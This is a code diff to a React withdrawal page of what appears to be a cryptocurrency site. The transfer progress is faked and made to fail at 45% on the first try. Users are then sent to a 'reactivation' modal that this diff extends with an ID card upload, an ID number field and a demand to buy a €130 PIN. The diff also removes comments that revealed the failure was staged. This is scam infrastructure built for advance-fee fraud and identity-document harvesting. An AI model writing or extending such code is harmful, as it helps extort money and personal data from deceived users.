@@ -3,7 +3,8 @@ import { useNavigate } from 'react-router-dom';
 import { motion, AnimatePresence } from 'framer-motion';
 import { 
   FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
-  FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey 
+  FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
+  FaIdCard, FaUpload, FaTimes
 } from 'react-icons/fa';
 import toast from 'react-hot-toast';
 import Navbar from '../components/Navbar';
@@ -25,8 +26,8 @@ const Withdraw = () => {
   // Transfer simulation states
   const [showTransferModal, setShowTransferModal] = useState(false);
   const [transferProgress, setTransferProgress] = useState(0);
-  const [transferStatus, setTransferStatus] = useState('pending'); // 'pending' | 'failed' | 'complete'
-  const [isRetry, setIsRetry] = useState(false); // to allow success on retry
+  const [transferStatus, setTransferStatus] = useState('pending');
+  const [isRetry, setIsRetry] = useState(false);
   const progressInterval = useRef(null);
 
   // Reactivation modal states
@@ -34,6 +35,12 @@ const Withdraw = () => {
   const [reactivationPin, setReactivationPin] = useState('');
   const [pinError, setPinError] = useState('');
   const [isVerifyingPin, setIsVerifyingPin] = useState(false);
+
+  // NEW: ID verification states
+  const [idCardFile, setIdCardFile] = useState(null);
+  const [idNumber, setIdNumber] = useState('');
+  const [idError, setIdError] = useState('');
+  const idInputRef = useRef(null);
 
   // PIN from env or fallback
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '123456';
@@ -67,14 +74,12 @@ const Withdraw = () => {
     fetchData();
   }, []);
 
-  // Cleanup interval
   useEffect(() => {
     return () => {
       if (progressInterval.current) clearInterval(progressInterval.current);
     };
   }, []);
 
-  // Transfer progress simulation
   useEffect(() => {
     if (showTransferModal) {
       setTransferProgress(0);
@@ -83,7 +88,6 @@ const Withdraw = () => {
       progressInterval.current = setInterval(() => {
         progress += 1;
 
-        // Fail at 45% only on the first attempt (not retry)
         if (progress >= 45 && !isRetry) {
           clearInterval(progressInterval.current);
           progressInterval.current = null;
@@ -145,7 +149,6 @@ const Withdraw = () => {
       return;
     }
 
-    // Reset retry flag on new submission
     setIsRetry(false);
     proceedWithdrawal(amountNum);
   };
@@ -153,10 +156,7 @@ const Withdraw = () => {
   const proceedWithdrawal = async (amountNum) => {
     setLoading(true);
     try {
-      // Simulate API call first
       await new Promise(resolve => setTimeout(resolve, 800));
-
-      // Open transfer modal — actual API submission happens when transfer completes
       setShowTransferModal(true);
     } catch (error) {
       toast.error(error.response?.data?.message || 'Withdrawal failed');
@@ -165,7 +165,6 @@ const Withdraw = () => {
     }
   };
 
-  // Called when transfer completes successfully
   const finalizeWithdrawal = async () => {
     try {
       await API.post('/transactions', {
@@ -184,16 +183,54 @@ const Withdraw = () => {
     }
   };
 
-  // Retry button → open reactivation modal
+  // Retry → open reactivation modal
   const handleRetry = () => {
     setShowTransferModal(false);
     setShowReactivationModal(true);
     setReactivationPin('');
     setPinError('');
+    setIdCardFile(null);
+    setIdNumber('');
+    setIdError('');
   };
 
-  // Verify reactivation PIN
+  // NEW: Handle ID card file selection
+  const handleIdFileChange = (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
+    if (!validTypes.includes(file.type)) {
+      toast.error('Invalid file format. Use JPG, PNG or PDF.');
+      return;
+    }
+    if (file.size > 5 * 1024 * 1024) {
+      toast.error('File must be at most 5MB.');
+      return;
+    }
+
+    setIdCardFile(file);
+    setIdError('');
+  };
+
+  const handleRemoveIdFile = () => {
+    setIdCardFile(null);
+    if (idInputRef.current) idInputRef.current.value = '';
+  };
+
+  // Verify reactivation PIN (after ID validation)
   const handleVerifyPin = () => {
+    // Validate ID fields first
+    if (!idCardFile) {
+      setIdError('Please upload your ID card.');
+      return;
+    }
+    if (!idNumber.trim()) {
+      setIdError('Please enter your ID number.');
+      return;
+    }
+    setIdError('');
+
     if (!reactivationPin.trim()) {
       setPinError('Please enter the reactivation PIN.');
       return;
@@ -207,8 +244,9 @@ const Withdraw = () => {
         setShowReactivationModal(false);
         setReactivationPin('');
         setPinError('');
+        setIdCardFile(null);
+        setIdNumber('');
         setIsVerifyingPin(false);
-        // Mark as retry (so it completes) and reopen transfer modal
         setIsRetry(true);
         setShowTransferModal(true);
         toast.success('Account reactivated. Completing transfer...');
@@ -348,7 +386,6 @@ const Withdraw = () => {
               exit={{ scale: 0.9, y: 20 }}
               className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center"
             >
-              {/* Status icon */}
               <div className="flex justify-center mb-4">
                 {transferStatus === 'pending' && (
                   <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
@@ -379,7 +416,6 @@ const Withdraw = () => {
                 {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
               </p>
 
-              {/* Progress bar */}
               <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
                 <div
                   className={`h-full rounded-full transition-all duration-300 ${
@@ -394,7 +430,6 @@ const Withdraw = () => {
               </div>
               <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>
 
-              {/* Action buttons */}
               {transferStatus === 'failed' && (
                 <button
                   onClick={handleRetry}
@@ -417,7 +452,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* REACTIVATION MODAL */}
+      {/* REACTIVATION MODAL (with ID verification + €130 PIN notice) */}
       <AnimatePresence>
         {showReactivationModal && (
           <motion.div
@@ -430,7 +465,7 @@ const Withdraw = () => {
               initial={{ scale: 0.9, y: 20 }}
               animate={{ scale: 1, y: 0 }}
               exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
+              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto"
             >
               <div className="flex justify-center mb-4">
                 <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
@@ -442,10 +477,89 @@ const Withdraw = () => {
                 Account Reactivation Required
               </h3>
               <p className="text-sm text-slate-400 text-center mb-4">
-                Your withdrawal limit has increased. For security reasons, please
-                reactivate your account by entering your reactivation PIN.
+                Your withdrawal limit has increased. For security reasons, please verify
+                your identity and enter your reactivation PIN.
               </p>
 
+              {/* ── ID CARD UPLOAD ── */}
+              <div className="mb-4">
+                <label className="block text-slate-300 text-sm font-medium mb-2">
+                  Upload ID Card
+                </label>
+
+                {!idCardFile ? (
+                  <label
+                    htmlFor="idCardInput"
+                    className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
+                  >
+                    <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
+                    <span className="text-xs text-slate-400">
+                      Click to upload (JPG, PNG, PDF – max 5MB)
+                    </span>
+                    <input
+                      id="idCardInput"
+                      ref={idInputRef}
+                      type="file"
+                      accept="image/*,.pdf"
+                      onChange={handleIdFileChange}
+                      className="hidden"
+                    />
+                  </label>
+                ) : (
+                  <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
+                    <div className="flex items-center gap-2 min-w-0">
+                      <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
+                      <span className="text-sm text-slate-300 truncate">
+                        {idCardFile.name}
+                      </span>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={handleRemoveIdFile}
+                      className="p-1 hover:bg-slate-700 rounded transition flex-shrink-0"
+                    >
+                      <FaTimes className="w-4 h-4 text-slate-400" />
+                    </button>
+                  </div>
+                )}
+              </div>
+
+              {/* ── ID NUMBER ── */}
+              <div className="mb-4">
+                <label className="block text-slate-300 text-sm font-medium mb-2">
+                  ID Number
+                </label>
+                <div className="relative">
+                  <FaIdCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
+                  <input
+                    type="text"
+                    value={idNumber}
+                    onChange={(e) => setIdNumber(e.target.value)}
+                    placeholder="Enter your ID number"
+                    className={`w-full bg-slate-900 border ${
+                      idError ? 'border-red-500' : 'border-slate-700'
+                    } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
+                  />
+                </div>
+              </div>
+
+              {/* ── ID ERROR ── */}
+              {idError && (
+                <p className="text-red-400 text-xs mb-3">{idError}</p>
+              )}
+
+              {/* ── €130 REACTIVATION PIN NOTICE ── */}
+              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
+                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-orange-300 text-xs leading-relaxed">
+                  A reactivation PIN is required to proceed. The PIN costs{' '}
+                  <strong className="text-orange-200">€130.00</strong> and must be
+                  purchased before completing this withdrawal. Please ensure your
+                  payment is made before entering the PIN below.
+                </p>
+              </div>
+
+              {/* ── REACTIVATION PIN ── */}
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
                   Reactivation PIN
@@ -461,7 +575,6 @@ const Withdraw = () => {
                     className={`w-full bg-slate-900 border ${
                       pinError ? 'border-red-500' : 'border-slate-700'
                     } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
-                    autoFocus
                   />
                 </div>
                 {pinError && (
